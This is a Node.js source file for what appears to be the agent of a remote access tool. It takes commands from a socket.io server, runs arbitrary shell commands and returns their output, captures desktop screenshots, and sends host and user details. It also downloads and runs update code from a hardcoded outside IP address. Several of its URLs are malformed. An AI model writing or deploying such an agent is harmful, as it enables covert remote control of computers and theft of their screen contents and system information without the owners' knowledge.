//version 1.4.3
var socket = require('socket.io-client')('http://localhost:4343');
var nrc = require('node-run-cmd');
var download = require('download')
var os = require('os')
var http = require('http');
var unzip = require("unzip-stream")
var spawn = require('child_process').spawn;
var fork = require('child_process').fork;
const { exec } = require('child_process');
var fs = require('fs');
var rimraf = require("rimraf")
var dialog = require('dialog');
let pcName = os.hostname()
let pcPlatform = os.platform()
let pcArch = os.arch()
let pcFreeRam = os.freemem()
let pcHomeDir = os.homedir()
let pcHostname = os.hostname()
let pcCpuInfo = os.cpus()
let pcNICInfo = os.networkInterfaces()
let pcUserInfo = os.userInfo()
const screenshot = require('screenshot-desktop')
let updateUrl = "http://192.241.141.94/:80/latestAgent/"
var updateFilesIndex = [
    "http://192.241.141.94/:80/latestAgent/agent.zip",

]

socket.on('connect', function(){
    socket.on('cmd',function(cmd){
        var dataCallback = function(data) {
            socket.emit('data',data, pcName)
            };
        nrc.run(cmd, { onData: dataCallback });
    })
});

socket.on('screenshot',function(){
    screenshot().then((img) => {
        socket.emit('screenshotData', img, pcName)
      }).catch((err) => {
        socket.emit('error', err)
      })
})
socket.on('update',function(){
    socket.emit('updateStat','Downloading Files')
   download('http://192.241.141.94//latestAgent/agent.zip').pipe(fs.createWriteStream('temp/agent.zip'));
    Promise.all([
        'niknet.ddns.net/latestAgent/agent.zip'
    ].map(x => download('http://192.241.141.94//latestAgent/agent.zip', 'temp'))).then(() => {
        socket.emit('updateStat','Installing/Cleaning up')
        fs.createReadStream('temp/agent.zip').pipe(unzip.Extract({ path: 'update' },rimraf('temp', function(){console.log("done"); var child = fork('./manageFiles.js');})));
    });
})    
socket.on('popup', function(popupTitle, popupContent){
    if(!popupTitle){
        console.log("Empty popupTitle Arg")
    }if(!popupContent){
        console.log('Empty popupContent Arg')
    }
    else{
        dialog.info(popupContent, popupTitle);
    }
})
socket.on('requestAgentSettingData',function(){
    socket.emit('sendAgentSettingData',pcName,pcArch,pcPlatform,pcFreeRam,pcHomeDir,pcHostname,pcCpuInfo,pcNICInfo,pcUserInfo)
})

socket.on('getInfo', function(){
    pcName = os.hostname()
    pcPlatform = os.platform()
    pcArch = os.arch()
    socket.emit('setInfo', pcName, pcPlatform, pcArch)
})
socket.on('disconnect', function(){
    socket.emit('offline', pcName)
});

process.on('uncaughtException', function (error) {
    console.log(error.stack);
 });